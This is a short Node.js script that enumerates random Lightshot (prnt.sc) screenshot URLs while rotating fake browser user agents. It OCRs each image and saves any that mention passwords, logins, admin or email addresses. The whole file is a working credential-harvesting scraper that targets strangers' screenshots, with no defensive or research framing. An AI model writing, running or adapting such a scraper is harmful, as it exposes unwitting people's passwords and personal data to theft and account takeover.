const axios = require('axios');					//npm install axios
const Tesseract = require('tesseract.js');		//npm install tesseract.js
const fs = require('fs');

const currentDate = new Date().toISOString().substr(0,10);

function RandomString (length) 
{
   var result           = '';
   var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) result += characters.charAt(Math.floor(Math.random() * charactersLength));
   return result;
}

var UserAgent = '';
const UserAgent0 = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
const UserAgent1 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36';
const UserAgent2 = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.109';
const UserAgent3 = 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0';

function downloadImage (url, path) 
{  
	const writer = fs.createWriteStream(path)
	axios({url, method: 'GET', responseType: 'stream'}).then(response =>
	{
		response.data.pipe(writer);
	});
}

function Search()
{
	var rand = parseInt(Math.floor(Math.random() * Math.floor(3)));
	if (rand == 0) UserAgent = UserAgent0;
	else if (rand == 1) UserAgent = UserAgent1;
	else if (rand == 2) UserAgent = UserAgent2;
	else UserAgent = UserAgent3;

	var ParseLink = "https://prnt.sc/"+RandomString(6);
	axios.get(ParseLink, { headers: { 'User-Agent': UserAgent }}).then(response => 
	{
		console.log("Parse link: " + ParseLink);
		var pos1 = response.data.search('<img class="no-click screenshot-image" src="') + 44;
		var pos2 = response.data.search('" crossorigin="anonymous" alt="Lightshot screenshot" id="screenshot-image" image-id="');
		var linkToImage = response.data.substr(pos1, pos2-pos1);
		console.log("Image link: " + linkToImage);

		if(linkToImage[0] != '/' && linkToImage[1] != '/')
		Tesseract.recognize(linkToImage,'eng').then(({ data: { text } }) => 
		{
			console.log(text);
			if(text.includes('pass') || text.includes('login') || text.includes('admin') || (text.includes('@') && text[text.search('@') + 1].match(/^[0-9a-z]+$/) ) ) 
			{
				var path = "./"+currentDate+"/"+linkToImage.substring(linkToImage.lastIndexOf('/') + 1);
				console.log("Found smth! Saving " + linkToImage + " to file: " + path);
				downloadImage(linkToImage, path);
			}
		});
	});
}

if (!fs.existsSync("./"+currentDate)) fs.mkdirSync("./"+currentDate);
Search();

